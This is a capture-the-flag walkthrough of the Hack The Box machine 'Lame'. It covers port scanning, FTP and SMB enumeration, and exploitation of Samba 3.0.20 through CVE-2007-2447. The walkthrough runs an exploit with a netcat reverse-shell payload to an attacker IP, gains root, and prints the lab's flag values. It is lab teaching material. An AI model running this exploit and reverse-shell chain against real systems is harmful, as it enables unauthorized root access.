## Basic Nmap Scan:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Lame]
└─$ nmap 10.129.42.176 -T4  -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-15 11:02 +0545
Nmap scan report for 10.129.42.176
Host is up (0.28s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds
```

## FTP Anonymous Login:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Lame]
└─$ ftp 10.129.42.176                                                                                                
Connected to 10.129.42.176.
220 (vsFTPd 2.3.4)
Name (10.129.42.176:parallels): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

```
Found nothing interesting in FTP.

## SMB Enumeration with Nmap:

```bash
┌──(parallels㉿V35HR4J)-[~/tjnull/Lame]
└─$ nmap 10.129.42.176 -T4 -p445 -Pn -sV -sC
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-15 11:06 +0545
Nmap scan report for 10.129.42.176
Host is up (0.29s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-12-15T00:22:26-05:00
|_clock-skew: mean: 2h30m24s, deviation: 3h32m10s, median: 22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.41 seconds
```

Now we know that the SMB version is 3.0.20-Debian. Let's search for any exploit for this version.
Quick google search leads us to https://github.com/Ziemni/CVE-2007-2447-in-Python

## Exploiting SMB:

```bash
──(parallels㉿V35HR4J)-[~/tjnull/Lame/CVE-2007-2447-in-Python]
└─$ python3 smbExploit.py 10.129.42.176 445 'nc -e /bin/sh 10.10.14.23 1234'
[*] Sending the payload
```

```bash
┌──(parallels㉿V35HR4J)-[~]
└─$ rev 1234
python3 -c 'import pty;pty.spawn("/bin/bash")'
listening on [any] 1234 ...
10.129.42.176: inverse host lookup failed: Unknown host
connect to [10.10.14.23] from (UNKNOWN) [10.129.42.176] 55821
whoami
root
cat `find / -name user.txt`
b2cb374131daec3fd21ed8db208ff5ff
cat `find / -name root.txt`
9cdfa56de6c1c8a7d90a92af0aa61cfa
```
# Takeaway from Lame:
- Don't forget to enumerate the version of the service, anonymous login on FTP and readable shares on SMB was just a rabbithole.